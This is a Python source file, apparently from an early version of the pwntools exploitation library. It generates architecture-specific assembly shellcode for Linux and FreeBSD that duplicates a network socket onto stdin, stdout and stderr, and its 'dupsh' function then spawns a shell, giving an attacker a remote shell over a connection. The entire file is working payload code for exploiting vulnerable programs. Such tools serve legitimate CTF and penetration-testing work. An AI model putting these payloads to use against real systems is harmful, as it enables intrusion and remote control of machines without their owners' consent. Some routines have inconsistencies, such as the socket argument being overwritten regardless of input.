from pwn.internal.shellcode_helper import *
from sh import sh

@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
def dupsh(sock = None, os = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell."""
    if os in ['freebsd', 'linux']:
        return dup(sock), sh()
    else:
        bug('OS was neither linux nor freebsd')

@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
def dup(sock = None, os = None, arch = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr."""

    if arch in ['thumb', 'arm']:
        sock = 'r6'
    else:
        sock = 'ebp'
    
    sock = arg_fixup(sock)

    if arch == 'i386':
        if os == 'freebsd':
            return _dup_freebsd_i386(sock)
        elif os == 'linux':
            return _dup_linux_i386(sock)
    elif arch == 'amd64':
        if os in ['linux', 'freebsd']:
            return _dup_amd64(sock)
    elif arch == 'arm' and os == 'linux':
        return _dup_linux_arm(sock)
    elif arch == 'thumb' and os == 'linux':
        return _dup_linux_thumb(sock)

    bug('OS/arch combination (%s,%s) is not supported for dup' % (os, arch))

def _dup_linux_i386(sock):
    return """
dup:
        """, pwn.shellcode.mov('ebx', sock, raw = True), """
        push 3
        pop ecx
.loop:
        dec ecx
        push SYS_dup2
        pop eax
        int 0x80
        jnz .loop
"""

def _dup_freebsd_i386(sock):
    return """
dup:
        """ + pwn.shellcode.mov('esi', sock, raw = True) + """
        push 2
        pop ebp
        push SYS_dup2
        pop eax
.loop:
        pushad
        int 0x80
        popad
        dec ebp
        jns .loop
.after:
"""

def _dup_amd64(sock):
    return """
dup:
        """ + pwn.shellcode.mov('ebp', sock, raw = True) + """
        push 3
.loop:
        mov edi, ebp
        pop rsi
        dec esi
        js .after
        push rsi
        push SYS_dup2
        pop rax
        syscall
        jmp .loop
.after:"""

def _dup_linux_arm(sock):
    return '\n'.join([
            pwn.shellcode.mov('r9', sock, raw = True),
            pwn.shellcode.mov('r8', 2, raw = True),
            'dup_helper:',
            'mov r0, r9',
            'mov r1, r8',
            'svc SYS_dup2',
            'adds r8, #-1',
            'bpl dup_helper'])

def _dup_linux_thumb(sock):
    def mov(r, v):
        return pwn.shellcode.mov(r, v, raw = True)

    out = mov('r1', 3)
    out+= mov('r7', 'SYS_dup2')
    out+= """
    loop:
        mov r0, %(sock)s
        sub r1, #1
        svc 1
        bne loop
    """ % {'sock': sock}
    return out
